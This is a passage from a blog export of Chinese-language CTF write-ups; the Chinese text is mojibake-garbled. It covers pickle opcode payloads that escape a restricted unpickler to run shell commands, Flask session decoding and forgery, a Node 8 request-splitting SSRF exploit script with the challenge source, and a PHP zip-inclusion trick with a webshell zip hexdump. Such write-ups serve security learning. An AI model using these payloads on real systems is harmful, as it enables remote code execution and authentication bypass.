b&#x27;\\x93&#x27; # same as GLOBAL but using names on the stacksMEMOIZE = b&#x27;\\x94&#x27; # store top of the stack in memoFRAME = b&#x27;\\x95&#x27; # indicate the beginning of a new frame# Protocol 5BYTEARRAY8 = b&#x27;\\x96&#x27; # push bytearrayNEXT_BUFFER = b&#x27;\\x97&#x27; # push next out-of-band bufferREADONLY_BUFFER = b&#x27;\\x98&#x27; # make top of stack readonly å‡ ä¸ªå¸¸ç”¨çš„ï¼š 1.b&#39;R&#39;: __reduce__()å‡½æ•°å¯¹åº”çš„å°±æ˜¯è¿™ä¸ªæ“ä½œç ï¼Œé€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé™¤æ­¤ä¹‹å¤–i,oè¿™ä¸¤ä¸ªopcodeä¹Ÿæ˜¯å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œæˆ–å®ä¾‹åŒ–å¯¹è±¡ 2.b&#39;c&#39;: å¯ä»¥å®ç°pythonä¸­æ¨¡å—çš„å¼•å…¥ï¼Œä½¿ç”¨æ–¹æ³•æ˜¯c[module]\\n[instance]\\nï¼Œå°†è·å¾—çš„å¯¹è±¡å…¥æ ˆ 3.b&#39;(&#39;: MARKï¼Œå…¥æ ˆ 4.b&#39;)&#39;: å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„ 5.b&#39;t&#39;: å¯»æ‰¾ä¸Šé¢çš„ä¸€ä¸ªMARKï¼Œå°†ä¹‹é—´å†…å®¹å­˜ä¸ºtuple(å…ƒç»„) 6.b&#39;d&#39;: å¯»æ‰¾ä¸Šé¢çš„ä¸€ä¸ªMARKï¼Œå°†ä¹‹é—´çš„å†…å®¹ç»„æˆdict(å­—å…¸)ï¼Œä¹‹é—´çš„å¯¹è±¡å¿…é¡»æ˜¯å¶æ•°ä¸ªï¼Œä½œä¸ºkey-valueå¯¹ 7.b&#39;p&#39;ï¼šå°†æ ˆé¡¶å¯¹è±¡å­˜è‡³memoï¼Œç­‰åˆ°è¦ç”¨çš„æ—¶å€™å¯ä»¥æ‹¿å‡ºæ¥ï¼Œä½¿ç”¨æ–¹æ³•æ˜¯px\\n(xå¯ä»¥æ˜¯1ï¼Œ2ï¼Œ3â€¦)ï¼Œåé¢æ¥ä¸€ä¸ªæ¢è¡Œï¼Œxåœ¨è¿™é‡Œå¯ä»¥ç†è§£ä¸ºåœ¨memoï¼ˆä¸€ä¸ªå­—å…¸ï¼‰ä¸­çš„keyå€¼ï¼Œæ³¨æ„æ­¤æ“ä½œå¹¶ä¸ä¼šå¯¹æ ˆé€ æˆå½±å“ 8.b&#39;g&#39;: ç»“åˆpä½¿ç”¨ï¼Œä»memoä¸­å°†æŒ‡å®šå¯¹è±¡å‹æ ˆï¼Œä½¿ç”¨æ–¹æ³•ï¼Œgx\\nï¼ŒåŒæ ·æ¥ä¸€ä¸ªæ¢è¡Œ 9.b&#39;0&#39;:popæ“ä½œï¼Œä»æ ˆä¸­å¼¹å‡ºä¸€ä¸ªå¯¹è±¡ 10.b&#39;b&#39;:èµ‹å€¼æ“ä½œï¼Œå¯ä»¥ç”¨äºå¯¹è±¡çš„å®ä¾‹åŒ–ï¼Œå°†æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå±æ€§:å±æ€§å€¼çš„å­—å…¸)ï¼Œèµ‹å€¼ç»™ç¬¬äºŒä¸ªå¯¹è±¡ï¼ˆç±»ï¼‰ï¼Œå®ä¾‹åŒ– å‡ ä¸ªopcodeçš„ä½¿ç”¨ä¾‹å­ 1234567891011121314opcode = b&#x27;&#x27;&#x27;cossystem(S&#x27;whoami&#x27;tR.&#x27;&#x27;&#x27;opcode1 = b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;iossystem.&#x27;&#x27;&#x27;opcode2 = b&#x27;&#x27;&#x27;(cossystemS&#x27;whoami&#x27;o.&#x27;&#x27;&#x27; ä¸Šé¢ä¸‰ä¸ªéƒ½å¯ä»¥å®ç°å‘½ä»¤çš„æ‰§è¡Œ ä½†å®˜æ–¹é’ˆå¯¹pickleçš„å®‰å…¨é—®é¢˜ï¼Œå¯¹å¼•å…¥æ¨¡å—åšäº†é™åˆ¶ï¼Œç”¨ç™½åå•çš„æ–¹å¼ï¼Œå…¶ä¸­æ¶‰åŠåˆ°pickle.Unpickler.find_class()è¿™ä¸ªæ–¹æ³•ï¼Œåœ¨opcodeåšå‡ºå¼•å…¥æ¨¡å—çš„æ“ä½œæ—¶ï¼Œä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼ˆå½“å‡ºç°cã€iã€b&#39;\\x93&#39;æ—¶ï¼Œä¼šè°ƒç”¨ï¼‰ï¼Œé™åˆ¶ä¹Ÿæ˜¯åœ¨è¿™é‡Œé¢å®ç° ä¾‹å­ï¼š 12345678910safe_builtins = &#123;&#x27;range&#x27;,&#x27;complex&#x27;,&#x27;set&#x27;,&#x27;frozenset&#x27;,&#x27;slice&#x27;,&#125;class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &quot;builtins&quot; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; %(module, name)) é‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œé™åˆ¶äº†å¼•å…¥çš„æ¨¡å—åªèƒ½æ˜¯builtinsï¼Œå­æ¨¡å—ä¸º&#123;&#39;range&#39;,&#39;complex&#39;,&#39;set&#39;,&#39;frozenset&#39;,&#39;slice&#39;,&#125; 0x03 é¢˜ç›®ä¾‹å­Code-Breaking:picklecodeé¢˜ç›®å°†pickleèƒ½å¤Ÿå¼•å…¥çš„æ¨¡å—é™å®šä¸ºbuiltinsï¼Œå¹¶ä¸”è®¾ç½®äº†å­æ¨¡å—é»‘åå•ï¼š&#123;&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;&#125; é»‘åå•é‡Œé¢æ²¡æœ‰getattrï¼Œæ€è·¯å°±æ˜¯é€šè¿‡getattræ‹¿åˆ°builtinsçš„å­æ¨¡å—evalå®ç°ä»»æ„ä»£ç æ‰§è¡Œ é¦–å…ˆè¦æ‹¿åˆ°builtinsæ¨¡å—ï¼Œç”±äºpickleæ— æ³•å¼•å…¥ä¸€çº§æ¨¡å—ï¼ˆæ— çˆ¶æ¨¡å—ï¼Œè§£å†³æ–¹æ³•ï¼Œé€šè¿‡å…¨å±€å˜é‡è·å–ï¼Œåœ¨å…¨å±€å˜é‡ä¸­å­˜åœ¨builtinsè¿™ä¸ªæ¨¡å—ï¼Œå› ä¸ºå·²ç»å¼•å…¥äº†ï¼Œbuiltins.globals()è¿”å›å…¨å±€å˜é‡çš„dict è¦ä»å­—å…¸ä¸­æ‹¿åˆ°builtinsï¼Œè¿˜éœ€è¦ç”¨åˆ°æ–¹æ³•dict.getï¼Œpickleä¸æ”¯æŒç‚¹è®¿é—®ï¼Œè¦ä½¿ç”¨çš„æ–¹æ³•ä»ç„¶æ˜¯ï¼Œå…ˆæ‹¿åˆ°dictæ¨¡å—ã€‚ç”¨getattrè·å–getæ–¹æ³• æœ€åçš„payloadï¼š 1getattr(getattr(builtins.dict,&#39;get&#39;)(builtins.globals(),&#39;builtins&#39;),&#39;eval&#39;)(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;) æ ¹æ®è¿™ä¸ªpayloadå¯ä»¥æ‰‹å†™opcode 1234567891011121314151617181920212223import pickle#getattr(getattr(builtins.dict,&#x27;get&#x27;)(builtins.globals(),&#x27;builtins&#x27;),&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;)code = b&#x27;&#x27;&#x27;cbuiltinsgetattrp0(cbuiltinsdictS&#x27;get&#x27;tRp1cbuiltinsglobals)Rp200g1(g2S&#x27;builtins&#x27;tRp30g0(g3S&#x27;eval&#x27;tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;tR.&#x27;&#x27;&#x27;pickle.loads(code) 0x04 pkerä½¿ç”¨ä½¿ç”¨pkerï¼Œå¯ä»¥æ›´æ–¹ä¾¿çš„ç¼–å†™pickle opcodeï¼ˆç‰ˆæœ¬æ˜¯0ï¼‰ https://github.com/eddieivan01/pker ä½¿ç”¨æ–¹æ³•ï¼š 1234567891011121314151617181920GLOBAL(&#39;os&#39;, &#39;system&#39;) &#x3D;&gt; cos\\nsystem\\nINST(&#39;os&#39;, &#39;system&#39;, &#39;ls&#39;) &#x3D;&gt; (S&#39;ls&#39;\\nios\\nsystem\\nOBJ(GLOBAL(&#39;os&#39;, &#39;system&#39;), &#39;ls&#39;) &#x3D;&gt; (cos\\nsystem\\nS&#39;ls&#39;\\noè¿™ä¸‰ä¸ªåˆ†åˆ«å¯¹åº”opcodeä¸­çš„b&#39;c&#39;,b&#39;i&#39;,b&#39;o&#39;xxx(xxx,...)å¯¹åº”b&#39;R&#39;æ›´æ–°åˆ—è¡¨æˆ–å­—å…¸çš„è¯ï¼Œç›´æ¥ä½¿ç”¨[]list[0]&#x3D;123dict[&#39;var&#39;] &#x3D; &#39;var1&#39;å¯¹åº”opcodeä¸­çš„b&#39;s&#39;å¯¹å¯¹è±¡å±æ€§èµ‹å€¼xx.attr &#x3D; 123å¯¹åº”opcodeä¸­çš„b&#39;s&#39;return &#x3D;&gt; .return var &#x3D;&gt; g_\\n.return 1 &#x3D;&gt; I1\\n. ä¾‹é¢˜ï¼šè¿˜æ˜¯ä¸Šé¢é‚£é“Code-Breaking: picklecode pkerä»£ç ï¼š 12345678getattr &#x3D; GLOBAL(&#39;builtins&#39;,&#39;getattr&#39;)dict &#x3D; GLOBAL(&#39;builtins&#39;,&#39;dict&#39;)dict_get &#x3D; getattr(dict,&#39;get&#39;)globals &#x3D; GLOBAL(&#39;builtins&#39;,&#39;globals&#39;)()builtins &#x3D; dict_get(globals,&#39;builtins&#39;)eval &#x3D; getattr(builtins,&#39;eval&#39;)eval(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)return 1b&#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\&#39;get\\&#39;\\ntRp2\\n0cbuiltins\\nglobals\\n(tRp3\\n0g2\\n(g3\\nS\\&#39;builtins\\&#39;\\ntRp4\\n0g0\\n(g4\\nS\\&#39;eval\\&#39;\\ntRp5\\n0g5\\n(S\\&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)\\&#39;\\ntR.&#39;","categories":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"pickle","slug":"pickle","permalink":"https://123-prog.github.io/tags/pickle/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"opcodeä½¿ç”¨","slug":"opcodeä½¿ç”¨","permalink":"https://123-prog.github.io/tags/opcode%E4%BD%BF%E7%94%A8/"},{"name":"pkerä½¿ç”¨","slug":"pkerä½¿ç”¨","permalink":"https://123-prog.github.io/tags/pker%E4%BD%BF%E7%94%A8/"}]},{"title":"flask sessioné—®é¢˜","slug":"flask-sessioné—®é¢˜","date":"2021-07-23T15:14:08.000Z","updated":"2021-07-24T16:05:16.141Z","comments":true,"path":"2021/07/23/flask-sessioné—®é¢˜/","link":"","permalink":"https://123-prog.github.io/2021/07/23/flask-session%E9%97%AE%E9%A2%98/","excerpt":"0x01 flask sessionç¯¡æ”¹","text":"0x01 flask sessionç¯¡æ”¹ flask session æ„æˆï¼šdata.timestamp.signal flaskå°†sessionå­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„cookieä¸­ï¼Œé‚£ä¹ˆå°±æœ‰è¢«ç¯¡æ”¹çš„å¯èƒ½ï¼Œflaskç”¨ç­¾åè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåœ¨ä¸çŸ¥é“secret_keyçš„æƒ…å†µä¸‹ï¼Œæ˜¯æ— æ³•ä¼ªé€ ç­¾åçš„ï¼Œä¸€ä½†æ‹¿åˆ°secret_keyï¼Œå°±å¯ä»¥ç¯¡æ”¹session flaskåºåˆ—åŒ–sessionçš„æ­¥éª¤ï¼š 1.å°†å¯¹è±¡è½¬æ¢æˆjsonå­—ç¬¦ä¸²ï¼Œä½œä¸ºsessionçš„æ•°æ®éƒ¨åˆ† 2.å¦‚æœæ•°æ®å‹ç¼©åé•¿åº¦æ›´çŸ­ï¼Œç”¨zlibåº“å‹ç¼© 3.å°†æ•°æ®è¿›è¡Œbase64ç¼–ç  4.é€šè¿‡hmacç®—æ³•è®¡ç®—å‡ºæ•°æ®çš„ç­¾åï¼Œå°†ç­¾åé™„åœ¨æ•°æ®åï¼Œç”¨â€.â€œåˆ†å‰² ç­¾åå¯ä»¥éªŒè¯æ•°æ®æ˜¯å¦è¢«æ›´æ”¹è¿‡ æ ¹æ®è¿™ä¸ªè¿‡ç¨‹ï¼Œå¯ä»¥ç”¨è¿™ä¸ªè„šæœ¬è§£å¯†å‡ºæ•°æ®: 1234567891011121314151617181920212223242526272829303132import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(&#x27;.&#x27;,1) payload, timestamp = payload.rsplit(&#x27;.&#x27;,1) decompress = False if payload.startswith(&#x27;.&#x27;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&quot;è§£ç å¤±è´¥&quot;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&quot;Could not zlib decompress the payload before decoding the payload&quot;) return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;: print(decryption(sys.argv[1])) å¦‚æœå¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼æ‹¿åˆ°secret_keyçš„è¯ï¼Œå°±å¯ä»¥æ›´æ”¹æ•°æ®ï¼Œç”Ÿæˆç­¾åï¼Œç¯¡æ”¹session ç”Ÿæˆsessionçš„è„šæœ¬ï¼š https://github.com/noraj/flask-session-cookie-manager","categories":[{"name":"å…¶ä»–","slug":"å…¶ä»–","permalink":"https://123-prog.github.io/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"å®¢æˆ·ç«¯session","slug":"å®¢æˆ·ç«¯session","permalink":"https://123-prog.github.io/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/"},{"name":"sessionä¼ªé€ ","slug":"sessionä¼ªé€ ","permalink":"https://123-prog.github.io/tags/session%E4%BC%AA%E9%80%A0/"}]},{"title":"buuoj NodeProxy","slug":"buuoj-NodeProxy","date":"2021-07-22T02:59:14.000Z","updated":"2021-09-22T10:14:44.234Z","comments":true,"path":"2021/07/22/buuoj-NodeProxy/","link":"","permalink":"https://123-prog.github.io/2021/07/22/buuoj-NodeProxy/","excerpt":"0x01 å®¡è®¡æºç /source","text":"0x01 å®¡è®¡æºç /source 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154// node 8.12.0const createError = require(&#x27;http-errors&#x27;);const express = require(&#x27;express&#x27;);const http = require(&#x27;http&#x27;);const path = require(&#x27;path&#x27;);const cookieParser = require(&#x27;cookie-parser&#x27;);const logger = require(&#x27;morgan&#x27;);const fs = require(&quot;fs&quot;)const crypto = require(&#x27;crypto&#x27;);const app = express();const flag = fs.readFileSync(&#x27;/flag&#x27;, &quot;utf-8&quot;);let session = require(&#x27;express-session&#x27;);let FileStore = require(&#x27;session-file-store&#x27;)(session);let identityKey = &#x27;session&#x27;;app.use(session(&#123; name: identityKey, secret: crypto.randomBytes(32).toString(&#x27;hex&#x27;), store: new FileStore(), saveUninitialized: false, resave: false, cookie: &#123; maxAge: 1000 * 60 * 600 &#125;&#125;));// view engine setupapp.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(logger(&#x27;dev&#x27;));app.use(express.json());app.use(express.urlencoded(&#123;extended: false&#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.all(&#x27;*&#x27;, function (req, res, next) &#123; if (req.session.username === undefined) &#123; req.session.username = &quot;guest&quot;; req.session.is_verified = false; &#125; next();&#125;);function checkIP(req) &#123; let ip = req.connection.remoteAddress; if (ip.substr(0, 7) === &quot;::ffff:&quot;) &#123; ip = ip.substr(7) &#125; // console.log(ip) return ip === &#x27;127.0.0.1&#x27;;&#125;app.get(&#x27;/&#x27;, function (req, res, next) &#123; // console.log(req.session.username) res.render(&#x27;index&#x27;, &#123;title: &#x27;Node Proxy&#x27;, username: req.session.username&#125;);&#125;);app.get(&#x27;/test&#x27;, function (req, res, next) &#123; res.send(&#x27;test test&#x27;);&#125;);app.get(&#x27;/source&#x27;, function (req, res) &#123; res.sendFile(path.join(__dirname + &#x27;/app.js&#x27;));&#125;);app.post(&#x27;/register&#x27;, function (req, res) &#123; if (req.body.username !== undefined) &#123; req.session.username = req.body.username; req.session.is_verified = false; res.render(&#x27;message&#x27;, &#123;message: &#x27;You have registered successfully!&#x27;&#125;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;No username provided!&#x27;&#125;); &#125;&#125;);app.post(&#x27;/verify&#x27;, function (req, res) &#123; if (checkIP(req) !== true) &#123; return res.status(403).render(&#x27;message&#x27;, &#123;message: &#x27;You are not from LOCAL!&#x27;&#125;); &#125; let token = req.body.token; console.log(&#x27;req: /verify &#x27; + req.session.username) if (token === &#x27;you_will_never_know&#x27; &amp;&amp; req.session.username !== &#x27;admin&#x27;) &#123; req.session.is_verified = true; console.log(req.session.username + &#x27; VERIFIED!&#x27;) res.render(&#x27;message&#x27;, &#123;message: &#x27;VERIFIED SUCCESS!&#x27;&#125;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;NO!&#x27;&#125;); &#125;&#125;);app.get(&#x27;/flag&#x27;, function (req, res) &#123; if (req.session.is_verified !== true) &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;NO! You are not verified!&#x27;&#125;); &#125; else if (req.session.username == &#x27;admin&#x27;) &#123; res.render(&#x27;message&#x27;, &#123;message: flag&#125;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;NO! You are not admin!&#x27;&#125;); &#125;&#125;);app.get(&#x27;/proxy&#x27;, function (req, res) &#123; let url = req.query.url ? req.query.url : &#x27;&#x27;; if (url) &#123; try &#123; http.get(url, (r) =&gt; &#123; const &#123;statusCode&#125; = r; if (r &amp;&amp; statusCode === 200) &#123; r.setEncoding(&#x27;utf8&#x27;); let data = &#x27;&#x27;; r.on(&#x27;data&#x27;, (chunk) =&gt; &#123; data += chunk; &#125;); r.on(&#x27;end&#x27;, () =&gt; &#123; res.send(data); &#125;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;error&#x27;&#125;); &#125; &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123; if (e.code === &quot;ECONNRESET&quot;) &#123; res.send(&quot;Timeout occurs&quot;); &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: e.message&#125;); &#125; &#125;); &#125; catch (error) &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;error&#x27;&#125;); &#125; &#125; else &#123; res.render(&#x27;message&#x27;, &#123;message: &#x27;Missing url param!&#x27;&#125;); &#125;&#125;)// catch 404 and forward to error handlerapp.use(function (req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function (err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get(&#x27;env&#x27;) === &#x27;development&#x27; ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render(&#x27;error&#x27;);&#125;);// listen on port 3000module.exports = app; åˆ†æå‡ ä¸ªè·¯ç”±è·¯å¾„ /registeræ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œå°†ç”¨æˆ·åå†™è¿›session /verifyè®¤è¯ï¼Œåªèƒ½æœ¬åœ°è®¿é—®ï¼Œæ»¡è¶³æ¡ä»¶token === &#39;you_will_never_know&#39; &amp;&amp; req.session.username !== &#39;admin&#39;è®¤è¯æˆåŠŸ /flagè·å–flagï¼Œéœ€è¦æ»¡è¶³ç”¨æˆ·åä¸ºadminï¼ˆæ³¨æ„è¿™é‡Œæ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼‰ä¸”sessionä¸­çš„è®¤è¯ä¿¡æ¯ä¸ºTrue /proxyè·¯ç”±å¯ä»¥ä»£ç†è¯·æ±‚ï¼Œé€šè¿‡å®ƒå®ç°SSRFï¼Œå®é™…ä¸Šæ˜¯å‘å‡ºäº†http.get()è¯·æ±‚ï¼ŒNodejs8çš„httpåº“æ˜¯æœ‰æ¼æ´çš„ è®¤è¯çš„æ—¶å€™éœ€è¦æ»¡è¶³req.session.username !== &#39;admin&#39;ï¼Œæ‹¿flagçš„æ—¶å€™éœ€è¦æ»¡è¶³req.session.username == &#39;admin&#39;, å¯ä»¥ä¼ å…¥[&quot;admin&quot;] ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œç„¶åé€šè¿‡proxyä»£ç†å‘èµ·è¯·æ±‚ï¼Œè¿›è¡ŒéªŒè¯ 0x02 æ‹†åˆ†æ”»å‡»çœ‹æ ·å­è¿™é‡Œåªèƒ½å‘/verifyå‘èµ·æœ¬åœ°getè¯·æ±‚ï¼Œä½†è®¤è¯éœ€è¦POSTä¸€ä¸ªtokenï¼Œæºç ç¬¬ä¸€è¡Œç»™äº†nodeç‰ˆæœ¬ï¼Œæ˜æ˜¾è¿™é‡Œæ˜¯è¦èµ°ç§POSTè¯·æ±‚ exp: 12345678910111213141516171819202122232425262728293031323334353637383940#coding=utf-8import requestsurl = &#x27;http://aae0dc25-d3e2-4da7-8f28-6065d1bcf957.node4.buuoj.cn&#x27;#æ³¨å†Œç”¨æˆ·data = &#x27;&#x27;&#x27;&#123;&quot;username&quot;:[&quot;admin&quot;]&#125;&#x27;&#x27;&#x27;headers = &#123;&quot;Content-Type&quot;:&quot;application/json; charset=utf-8&quot;&#125;r = requests.post(url+&#x27;/register&#x27;, data=data, headers=headers)if &#x27;successfully!&#x27; in r.text: print(&quot;[*]register successfully!&quot;)cookies = requests.utils.dict_from_cookiejar(r.cookies)#éªŒè¯payload = &quot;&quot;&quot; HTTP/1.1Host: 127.0.0.1:3000POST /verify HTTP/1.1Host: 127.0.0.1:3000Content-Length: &#123;&#125;Content-Type: application/x-www-form-urlencodedCookie: session=&#123;&#125;&#123;&#125;GET /&quot;&quot;&quot;.replace(&#x27;\\n&#x27;, &#x27;\\r\\n&#x27;)body = &quot;token=you_will_never_know&quot;payload = payload.format(len(body), cookies[&#x27;session&#x27;], body)#print(payload)payload = &#x27;&#x27;.join(chr(int(&#x27;0xff&#x27; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)#print(payload)r = requests.get(url+&#x27;/proxy&#x27;, params=&#123;&#x27;url&#x27;:&#x27;http://127.0.0.1:3000/&#x27;+payload&#125;)print(&quot;[*]verify successfully!&quot;)#getFlagprint(requests.get(url+&#x27;/flag&#x27;,cookies=cookies).text)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"Nodejs","slug":"CTF/Nodejs","permalink":"https://123-prog.github.io/categories/CTF/Nodejs/"}],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"https://123-prog.github.io/tags/SSRF/"},{"name":"Node 8.12.0çš„æ‹†åˆ†è¯·æ±‚æ”»å‡»ï¼ˆèµ°ç§ï¼‰","slug":"Node-8-12-0çš„æ‹†åˆ†è¯·æ±‚æ”»å‡»ï¼ˆèµ°ç§ï¼‰","permalink":"https://123-prog.github.io/tags/Node-8-12-0%E7%9A%84%E6%8B%86%E5%88%86%E8%AF%B7%E6%B1%82%E6%94%BB%E5%87%BB%EF%BC%88%E8%B5%B0%E7%A7%81%EF%BC%89/"}]},{"title":"TCTF-0CTF 1linephp","slug":"TCTF-0CTF-1linephp","date":"2021-07-18T15:35:46.000Z","updated":"2021-09-22T10:14:10.812Z","comments":true,"path":"2021/07/18/TCTF-0CTF-1linephp/","link":"","permalink":"https://123-prog.github.io/2021/07/18/TCTF-0CTF-1linephp/","excerpt":"0x01æºç  12&lt;?php($_=@$_GET[&#x27;yxxx&#x27;].&#x27;.php&#x27;) &amp;&amp; @substr(file($_)[0],0,6) === &#x27;@&lt;?php&#x27; ? include($_) : highlight_file(__FILE__) &amp;&amp; include(&#x27;phpinfo.html&#x27;);","text":"0x01æºç  12&lt;?php($_=@$_GET[&#x27;yxxx&#x27;].&#x27;.php&#x27;) &amp;&amp; @substr(file($_)[0],0,6) === &#x27;@&lt;?php&#x27; ? include($_) : highlight_file(__FILE__) &amp;&amp; include(&#x27;phpinfo.html&#x27;); éœ€è¦æ»¡è¶³æ–‡ä»¶åç¼€ä¸ºphpï¼Œæ–‡ä»¶å†…å®¹å¼€å¤´ä¸º@&lt;?php ä¸Šä¼ æ–‡ä»¶ï¼Œpost PHP_SESSION_UPLOAD_PROGRESSå˜é‡ï¼Œå‘sessionæ–‡ä»¶ä¸­æ’å…¥payload zip://ä¼ªåè®®åŒ…å«sessionæ–‡ä»¶ 0x02 zipæ–‡ä»¶ç»“æ„zipæ–‡ä»¶å¯ä»¥çœ‹ä½œä¸‰éƒ¨åˆ†ç»„æˆ å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼ˆåŒ…æ‹¬æ–‡ä»¶å¤´ï¼Œæ–‡ä»¶æ•°æ®ï¼Œæ•°æ®æè¿°ç¬¦ç­‰ç­‰ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰è¿™ä¹ˆä¸€ä»½ç©ºé—´ï¼‰ æ ¸å¿ƒç›®å½• ç›®å½•ç»“æŸæ ‡å¿— ä¸€ä¸ªä¾‹å­ï¼šshell.zip(åŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼Œshell.php) 1234567891011121314151600000000 50 4b 03 04 0a 00 00 00 00 00 45 bc f2 52 19 fa |PK........E..R..|00000010 6f fc 41 00 00 00 41 00 00 00 09 00 1c 00 73 68 |o.A...A.......sh|00000020 65 6c 6c 2e 70 68 70 55 54 09 00 03 f2 49 f4 60 |ell.phpUT....I.&#96;|00000030 8c 48 f4 60 75 78 0b 00 01 04 e8 03 00 00 04 e8 |.H.&#96;ux..........|00000040 03 00 00 40 3c 3f 70 68 70 0a 65 63 68 6f 20 22 |...@&lt;?php.echo &quot;|00000050 6e 61 70 70 69 6e 67 43 34 74 20 79 6f 75 20 67 |nappingC4t you g|00000060 6f 74 20 69 74 21 22 2e 27 3c 62 72 3e 27 3b 0a |ot it!&quot;.&#39;&lt;br&gt;&#39;;.|00000070 73 79 73 74 65 6d 28 27 77 68 6f 61 6d 69 27 29 |system(&#39;whoami&#39;)|00000080 3b 3f 3e 0a 50 4b 01 02 1e 03 0a 00 00 00 00 00 |;?&gt;.PK..........|00000090 45 bc f2 52 19 fa 6f fc 41 00 00 00 41 00 00 00 |E..R..o.A...A...|000000a0 09 00 18 00 00 00 00 00 01 00 00 00 a4 81 00 00 |................|000000b0 00 00 73 68 65 6c 6c 2e 70 68 70 55 54 05 00 03 |..shell.phpUT...|000000c0 f2 49 f4 60 75 78 0b 00 01 04 e8 03 00 00 04 e8 |.I.&#96;ux..........|000000d0 03 00 00 50 4b 05 06 00 00 00 00 01 00 01 00 4f |...PK..........O|000000e0 00 00 00 84 00 00 00 00 00 |.........|000000e9 é¦–å…ˆçœ‹æºæ–‡ä»¶æ•°æ®åŒºï¼Œå³ä»æ–‡ä»¶å¤´æ ‡è¯†ï¼ˆ0x04034b50ï¼‰åˆ°æ ¸å¿ƒç›®å½•æ–‡ä»¶å¤´ï¼ˆ0x02014b50)çš„éƒ¨åˆ† 12345678900000000 50 4b 03 04 0a 00 00 00 00 00 45 bc f2 52 19 fa |PK........E..R..|00000010 6f fc 41 00 00 00 41 00 00 00 09 00 1c 00 73 68 |o.A...A.......sh|00000020 65 6c 6c 2e 70 68 70 55 54 09 00 03 f2 49 f4 60 |ell.phpUT....I.&#96;|00000030 8c 48 f4 60 75 78 0b 00 01 04 e8 03 00 00 04 e8 |.H.&#96;ux..........|00000040 03 00 00 40 3c 3f 70 68 70 0a 65 63 68 6f 20 22 |...@&lt;?php.echo &quot;|00000050 6e 61 70 70 69 6e 67 43 34 74 20 79 6f 75 20 67 |nappingC4t you g|00000060 6f 74 20 69 74 21 22 2e 27 3c 62 72 3e 27 3b 0a |ot it!&quot;.&#39;&lt;br&gt;&#39;;.|00000070 73 79 73 74 65 6d 28 27 77 68 6f 61 6d 69 27 29 |system(&#39;whoami&#39;)|00000080 3b 3f 3e 0a |;?&gt;. 